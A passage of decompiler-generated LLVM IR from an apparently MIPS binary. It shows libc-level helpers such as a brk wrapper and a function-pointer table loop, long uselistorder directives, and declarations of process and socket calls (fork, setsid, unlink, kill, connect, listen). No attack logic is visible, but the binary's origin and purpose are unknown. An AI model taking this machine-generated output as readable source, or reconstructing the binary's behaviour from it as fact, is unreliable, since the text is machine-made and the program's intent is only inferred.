  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_4080b8, label %dec_label_pc_4080bc, label %dec_label_pc_4080d0

dec_label_pc_4080bc:                              ; preds = %dec_label_pc_4080b0
  %v0_4080c0 = load i32, i32* %gp.global-to-local, align 4
  %v1_4080c0 = add i32 %v0_4080c0, -32420
  %v2_4080c0 = inttoptr i32 %v1_4080c0 to i32*
  %v3_4080c0 = load i32, i32* %v2_4080c0, align 4
  store i32 4, i32* %v2_4080b0, align 4
  store i32 127, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4080c0)
  br label %dec_label_pc_4080d0

dec_label_pc_4080d0:                              ; preds = %dec_label_pc_4080b0, %dec_label_pc_4080bc
  ret i32 4

; uselistorder directives
  uselistorder i32 %v3_40807418, { 1, 0 }
  uselistorder i32 %v2_408044, { 1, 0, 2 }
  uselistorder i32 %v3_407f7c25, { 1, 0 }
  uselistorder i32 %v2_407f64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %tmp11, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 9, 1, 10, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 5, 3, 4, 2, 6, 7, 9, 8, 10, 12, 11, 13 }
  uselistorder i32* %gp.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %a0.global-to-local, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 10, 9, 11, 12 }
  uselistorder i32 127, { 1, 2, 0, 3 }
  uselistorder i32 3, { 4, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 3, 23, 24, 25, 5, 26, 27, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32 (i32, i32)* @function_406dac, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 136, { 1, 0, 2, 3 }
  uselistorder i32 ()* @function_4006d0, { 1, 0 }
  uselistorder i32* @global_var_4499c8.2, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 ()* @unknown_0, { 7, 6, 5, 4, 3, 2, 1, 0, 10, 9, 8 }
  uselistorder i32 2, { 6, 7, 31, 32, 33, 34, 35, 36, 3, 37, 0, 38, 13, 14, 1, 4, 5, 10, 9, 15, 39, 40, 16, 41, 17, 42, 43, 18, 44, 19, 45, 46, 20, 11, 2, 21, 47, 22, 23, 24, 25, 26, 48, 29, 28, 27, 8, 30, 49, 12, 50, 51 }
  uselistorder i32 ()* @function_404bc0, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @a1, { 17, 18, 19, 4, 1, 20, 5, 21, 22, 23, 24, 25, 15, 26, 6, 27, 28, 16, 13, 14, 12, 29, 3, 30, 31, 7, 2, 0, 11, 32, 33, 34, 35, 8, 36, 9, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 10, 64, 65, 66, 67, 68, 69 }
  uselistorder i32 6, { 3, 5, 6, 7, 1, 8, 0, 9, 10, 11, 12, 13, 2, 4 }
  uselistorder i32* @a0, { 21, 2, 22, 23, 0, 1, 7, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 19, 18, 37, 8, 5, 38, 39, 40, 9, 41, 42, 10, 3, 4, 43, 17, 44, 45, 20, 11, 12, 46, 47, 16, 6, 13, 48, 49, 14, 15, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder i32 4, { 0, 48, 57, 1, 2, 3, 4, 58, 59, 39, 40, 5, 6, 60, 61, 41, 42, 7, 62, 8, 9, 63, 64, 65, 66, 67, 68, 10, 11, 12, 69, 70, 43, 13, 14, 15, 16, 17, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 18, 19, 20, 21, 22, 85, 86, 87, 23, 88, 89, 90, 24, 25, 26, 27, 91, 92, 28, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 29, 30, 104, 105, 106, 107, 108, 109, 53, 110, 45, 111, 44, 112, 46, 113, 31, 114, 115, 116, 117, 32, 47, 118, 119, 120, 33, 121, 122, 123, 124, 125, 126, 34, 127, 128, 52, 129, 35, 54, 55, 36, 37, 38, 130, 131, 132, 133, 49, 50, 56, 51, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147 }
  uselistorder i32 32, { 18, 19, 20, 21, 0, 22, 23, 24, 25, 26, 27, 1, 2, 3, 28, 16, 14, 29, 4, 5, 6, 30, 7, 9, 8, 10, 11, 12, 13, 15, 31, 32, 33, 17, 34 }
  uselistorder label %dec_label_pc_4080d0, { 1, 0 }
  uselistorder label %dec_label_pc_4080b0, { 1, 0 }
  uselistorder label %dec_label_pc_4080a0, { 1, 0 }
  uselistorder label %dec_label_pc_408068.dec_label_pc_408068_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_408020, { 1, 0 }
  uselistorder label %dec_label_pc_407fb8, { 1, 0 }
  uselistorder label %dec_label_pc_407f70.dec_label_pc_407f70_crit_edge, { 1, 0 }
}

define i32 @function_4080e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4080e0:
  %v1_4080ec = add i32 %arg1, 28
  %v2_4080ec = inttoptr i32 %v1_4080ec to i32*
  %v3_4080ec = load i32, i32* %v2_4080ec, align 4
  %v3_4080f0 = load i32, i32* bitcast (i32** @global_var_449b4c.262 to i32*), align 4
  %v2_4080f8 = inttoptr i32 %v3_4080f0 to i32*
  store i32 %v3_4080ec, i32* %v2_4080f8, align 4
  %v1_4080fc = add i32 %arg1, 44
  %v2_4080fc = inttoptr i32 %v1_4080fc to i32*
  %v3_4080fc = load i32, i32* %v2_4080fc, align 4
  %v3_408100 = load i32, i32* bitcast (i32** @global_var_449ac0.264 to i32*), align 4
  %v3_408104 = inttoptr i32 %v3_408100 to i32*
  store i32 %v3_4080fc, i32* %v3_408104, align 4
  ret i32 %v3_408100

; uselistorder directives
  uselistorder i32 28, { 3, 4, 5, 6, 7, 8, 9, 10, 1, 11, 2, 12, 0 }
}

define i32 @function_408110(i32* %arg1) local_unnamed_addr {
dec_label_pc_408110:
  %a0.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v3_408128 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_408128, i32* %a2.global-to-local, align 4
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v2_40813c = call i32 @brk(i32* %arg1)
  %v3_408140 = load i32, i32* bitcast (i32** @global_var_449ac4.255 to i32*), align 4
  %v2_408144 = icmp ult i32 %v2_40813c, %tmp
  store i32 0, i32* %a0.global-to-local, align 4
  %v1_40814c = icmp eq i1 %v2_408144, false
  %v4_40814c = inttoptr i32 %v3_408140 to i32*
  store i32 %v2_40813c, i32* %v4_40814c, align 4
  br i1 %v1_40814c, label %dec_label_pc_408170, label %dec_label_pc_408150

dec_label_pc_408150:                              ; preds = %dec_label_pc_408110
  %v0_408154 = load i32, i32* %a2.global-to-local, align 4
  store i32 %v0_408154, i32* @t9, align 4
  %v1_408158 = call i32 @function_4056e0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_40816c = inttoptr i32 %v1_408158 to i32*
  store i32 12, i32* %v2_40816c, align 4
  br label %dec_label_pc_408170

dec_label_pc_408170:                              ; preds = %dec_label_pc_408110, %dec_label_pc_408150
  %v0_408174 = load i32, i32* %a0.global-to-local, align 4
  ret i32 %v0_408174

; uselistorder directives
  uselistorder i32* %a0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32 12, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 0, 20, 4, 21, 5, 22, 23, 24, 25, 6, 26, 27, 28, 7, 29, 30, 31, 32, 33, 2, 34, 35, 36, 37, 38 }
  uselistorder i32 ()* @function_4056e0, { 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 2, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i1 false, { 10, 0, 1, 11, 12, 7, 13, 14, 2, 8, 15, 16, 3, 4, 17, 18, 19, 20, 5, 21, 9, 22, 23, 24, 6, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_408170, { 1, 0 }
}

define i32 @function_408180(i32 %arg1) local_unnamed_addr {
dec_label_pc_408180:
  %s1.global-to-local = alloca i32, align 4
  %v0_408190 = load i32, i32* @ra, align 4
  %v0_408194 = load i32, i32* @s0, align 4
  %v3_40819c = load i32, i32* @global_var_449a0c.265, align 4
  store i32 %v3_40819c, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_4081a4 = call i32 @function_404e30()
  %v0_4081b0 = load i32, i32* @s0, align 4
  %v3_4081b4 = load i32, i32* @global_var_449a10.266, align 4
  store i32 %v3_4081b4, i32* @t9, align 4
  store i32 %v0_408190, i32* @ra, align 4
  store i32 %v0_408194, i32* @s0, align 4
  %v6_4081c4 = call i32 @function_404f50(i32 %v2_4081a4, i32 %v0_4081b0)
  %v1_4081d8 = load i32, i32* @t9, align 4
  %v1_4081f0 = add i32 %v1_4081d8, 268280
  %v2_4081f0 = inttoptr i32 %v1_4081f0 to i32*
  %v3_4081f0 = load i32, i32* %v2_4081f0, align 4
  %v1_4081f8 = add i32 %v3_4081f0, -26620
  %v1_4081fc = add i32 %v3_4081f0, -26624
  %v2_4081fc = inttoptr i32 %v1_4081fc to i32*
  %v3_4081fc = load i32, i32* %v2_4081fc, align 4
  %v2_408204 = icmp eq i32 %v3_4081fc, -1
  br i1 %v2_408204, label %dec_label_pc_408228, label %dec_label_pc_408208

dec_label_pc_408208:                              ; preds = %dec_label_pc_408180
  store i32 -1, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_408210

dec_label_pc_408210:                              ; preds = %dec_label_pc_408210, %dec_label_pc_408208
  %v1_408210 = phi i32 [ %v2_408210, %dec_label_pc_408210 ], [ %v1_4081fc, %dec_label_pc_408208 ]
  %v0_408210 = phi i32 [ %v2_408218, %dec_label_pc_408210 ], [ %v3_4081fc, %dec_label_pc_408208 ]
  %v2_408210 = add i32 %v1_408210, -4
  call void @__pseudo_call(i32 %v0_408210)
  %v1_408218 = inttoptr i32 %v2_408210 to i32*
  %v2_408218 = load i32, i32* %v1_408218, align 4
  %v1_408220 = load i32, i32* %s1.global-to-local, align 4
  %v2_408220 = icmp eq i32 %v2_408218, %v1_408220
  br i1 %v2_408220, label %dec_label_pc_408228, label %dec_label_pc_408210

dec_label_pc_408228:                              ; preds = %dec_label_pc_408210, %dec_label_pc_408180
  ret i32 %v1_4081f8

; uselistorder directives
  uselistorder i32 %v2_408218, { 1, 0 }
  uselistorder i32 -4, { 13, 14, 4, 15, 16, 5, 17, 6, 2, 18, 3, 7, 8, 9, 19, 10, 11, 1, 20, 12, 21, 0 }
  uselistorder i32 -1, { 104, 22, 105, 94, 106, 11, 12, 13, 107, 95, 108, 9, 10, 23, 109, 110, 111, 24, 96, 25, 112, 26, 27, 28, 113, 29, 114, 30, 115, 116, 68, 118, 117, 31, 119, 32, 120, 33, 121, 72, 122, 97, 0, 123, 124, 98, 99, 125, 126, 100, 127, 73, 128, 74, 129, 130, 7, 8, 131, 132, 133, 1, 34, 134, 135, 101, 136, 137, 75, 138, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 139, 140, 141, 17, 18, 19, 142, 143, 144, 145, 146, 14, 15, 16, 102, 103, 46, 147, 47, 48, 49, 50, 51, 52, 53, 148, 54, 149, 55, 150, 56, 57, 58, 59, 60, 61, 151, 62, 152, 63, 2, 153, 154, 155, 156, 157, 70, 158, 159, 76, 3, 160, 71, 77, 4, 161, 20, 162, 163, 64, 164, 78, 165, 79, 166, 65, 80, 167, 69, 81, 168, 82, 169, 83, 170, 171, 172, 84, 173, 85, 174, 175, 176, 5, 177, 86, 178, 21, 87, 179, 180, 88, 181, 66, 182, 89, 183, 67, 90, 184, 91, 6, 185, 92, 93 }
  uselistorder i32 (i32, i32)* @function_404f50, { 2, 1, 0 }
  uselistorder i32 ()* @function_404e30, { 1, 0 }
  uselistorder i32* @t9, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 0, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 1, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316 }
  uselistorder i32* @s0, { 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 35, 36, 37, 38, 39, 3, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 4, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 5, 6, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168 }
  uselistorder i32 1, { 228, 43, 42, 291, 414, 288, 415, 332, 331, 204, 205, 203, 201, 202, 416, 417, 269, 270, 399, 235, 236, 237, 238, 239, 240, 243, 244, 241, 242, 246, 245, 36, 34, 35, 37, 40, 38, 39, 41, 31, 33, 32, 220, 219, 125, 346, 222, 221, 266, 252, 250, 251, 347, 255, 264, 253, 257, 256, 259, 260, 261, 262, 265, 258, 263, 254, 400, 21, 18, 19, 20, 17, 348, 197, 22, 23, 91, 333, 88, 89, 418, 419, 349, 74, 76, 72, 75, 79, 71, 77, 80, 78, 73, 276, 289, 420, 249, 292, 421, 422, 345, 344, 343, 342, 124, 122, 120, 119, 123, 121, 293, 350, 218, 83, 85, 86, 84, 81, 87, 82, 27, 25, 24, 26, 198, 199, 200, 30, 28, 29, 277, 423, 351, 195, 193, 194, 196, 294, 295, 401, 354, 353, 352, 178, 179, 177, 268, 140, 2, 215, 15, 217, 247, 16, 57, 55, 56, 424, 278, 425, 426, 139, 137, 127, 128, 126, 138, 130, 132, 133, 134, 131, 135, 136, 129, 427, 271, 402, 64, 65, 355, 296, 403, 356, 357, 286, 358, 66, 67, 68, 69, 1, 234, 267, 12, 13, 14, 44, 216, 45, 233, 232, 359, 231, 174, 46, 230, 229, 428, 429, 430, 431, 70, 360, 432, 433, 434, 435, 436, 361, 143, 146, 144, 145, 147, 142, 141, 437, 438, 363, 362, 95, 99, 100, 101, 102, 94, 96, 103, 97, 98, 439, 440, 441, 442, 443, 444, 404, 47, 49, 48, 445, 446, 323, 50, 297, 365, 364, 447, 448, 298, 299, 53, 52, 51, 54, 449, 450, 451, 452, 453, 148, 454, 455, 456, 366, 62, 60, 61, 63, 457, 458, 459, 460, 461, 272, 149, 151, 150, 462, 463, 90, 464, 465, 248, 466, 467, 468, 59, 58, 469, 470, 300, 301, 337, 336, 335, 334, 171, 170, 172, 169, 173, 471, 405, 406, 407, 472, 408, 473, 409, 474, 475, 476, 477, 478, 410, 279, 479, 274, 480, 302, 481, 482, 483, 280, 484, 485, 486, 303, 411, 376, 375, 374, 373, 372, 371, 370, 369, 368, 324, 367, 209, 211, 214, 208, 210, 206, 207, 213, 212, 4, 3, 5, 412, 413, 487, 304, 379, 378, 377, 224, 225, 226, 227, 223, 488, 489, 189, 187, 188, 191, 185, 186, 192, 190, 490, 491, 492, 493, 494, 495, 275, 496, 497, 305, 498, 499, 306, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 388, 327, 387, 386, 385, 325, 384, 383, 382, 326, 381, 380, 108, 118, 110, 106, 114, 107, 105, 117, 104, 115, 116, 113, 112, 111, 109, 510, 93, 92, 309, 307, 308, 310, 311, 511, 273, 312, 313, 314, 512, 315, 316, 317, 318, 319, 513, 320, 321, 514, 396, 395, 394, 393, 392, 328, 391, 390, 389, 8, 10, 6, 7, 11, 9, 322, 515, 281, 516, 517, 398, 397, 518, 519, 520, 521, 522, 282, 523, 524, 283, 284, 525, 290, 526, 527, 528, 529, 530, 329, 341, 340, 339, 338, 160, 167, 164, 158, 157, 165, 159, 163, 161, 168, 162, 166, 287, 175, 176, 531, 0, 532, 533, 534, 535, 184, 181, 180, 183, 182, 536, 537, 538, 155, 156, 152, 154, 153, 285, 330 }
}

define i32 @function_408240() local_unnamed_addr {
entry:
  %v0_408254 = load i32, i32* @ra, align 4
  %v1_408270 = add i32 %v0_408254, 268140
  %v2_408270 = inttoptr i32 %v1_408270 to i32*
  %v3_408270 = load i32, i32* %v2_408270, align 4
  %v1_408278 = add i32 %v3_408270, 288
  call void @__pseudo_call(i32 %v1_408278)
  %v4_408294 = load i32, i32* @v0, align 4
  ret i32 %v4_408294

; uselistorder directives
  uselistorder i32* @v0, { 8, 43, 0, 44, 45, 46, 47, 3, 1, 48, 49, 6, 7, 20, 50, 21, 51, 22, 52, 53, 11, 54, 55, 12, 2, 56, 5, 4, 57, 13, 14, 15, 16, 17, 58, 18, 19, 59, 34, 35, 60, 61, 36, 62, 63, 64, 23, 24, 65, 25, 26, 27, 28, 66, 29, 67, 68, 69, 70, 30, 31, 32, 71, 33, 72, 73, 74, 75, 37, 38, 39, 40, 41, 76, 42, 9, 10 }
  uselistorder void (i32)* @__pseudo_call, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 0, 1, 2 }
  uselistorder i32 0, { 161, 145, 162, 163, 164, 165, 15, 166, 167, 168, 169, 170, 171, 172, 75, 173, 174, 76, 175, 176, 177, 178, 179, 180, 22, 181, 182, 183, 184, 185, 186, 25, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 28, 27, 77, 78, 198, 199, 200, 201, 202, 203, 26, 204, 79, 205, 29, 206, 207, 208, 80, 81, 0, 209, 210, 23, 211, 212, 213, 214, 215, 30, 216, 217, 218, 219, 220, 221, 222, 223, 224, 19, 225, 226, 227, 228, 229, 230, 1, 231, 232, 233, 234, 235, 236, 82, 237, 31, 69, 238, 239, 240, 241, 242, 243, 244, 245, 246, 2, 3, 154, 247, 12, 155, 248, 249, 250, 144, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 17, 261, 32, 262, 263, 264, 265, 266, 267, 268, 16, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 33, 303, 34, 11, 304, 35, 305, 306, 307, 308, 309, 310, 83, 311, 312, 313, 314, 315, 316, 317, 36, 318, 319, 320, 321, 37, 322, 38, 39, 323, 84, 324, 40, 325, 326, 327, 328, 20, 21, 41, 43, 42, 10, 44, 329, 330, 331, 332, 333, 334, 46, 45, 335, 65, 18, 336, 337, 47, 338, 339, 340, 341, 71, 342, 343, 86, 87, 344, 345, 88, 89, 346, 347, 90, 348, 349, 350, 351, 352, 353, 354, 146, 91, 92, 147, 355, 356, 357, 70, 358, 359, 93, 85, 360, 361, 362, 363, 148, 149, 364, 48, 365, 366, 49, 50, 367, 368, 94, 369, 150, 95, 370, 51, 371, 4, 5, 372, 96, 373, 374, 97, 98, 99, 375, 376, 377, 100, 101, 378, 379, 380, 381, 102, 382, 103, 53, 52, 383, 384, 66, 54, 385, 151, 386, 67, 152, 387, 388, 153, 389, 390, 391, 392, 104, 393, 394, 105, 395, 396, 106, 397, 13, 14, 6, 398, 399, 107, 7, 72, 400, 73, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 24, 57, 56, 55, 415, 416, 68, 417, 418, 419, 420, 9, 421, 422, 423, 8, 424, 62, 425, 58, 426, 59, 427, 63, 428, 60, 429, 61, 430, 64, 74, 156, 157, 158, 159, 160, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447 }
  uselistorder i32* @ra, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @getrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @sys_clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getegid() local_unnamed_addr

declare i32 @geteuid() local_unnamed_addr

declare i32 @getgid() local_unnamed_addr

declare i32 @getuid() local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

attributes #0 = { noreturn }
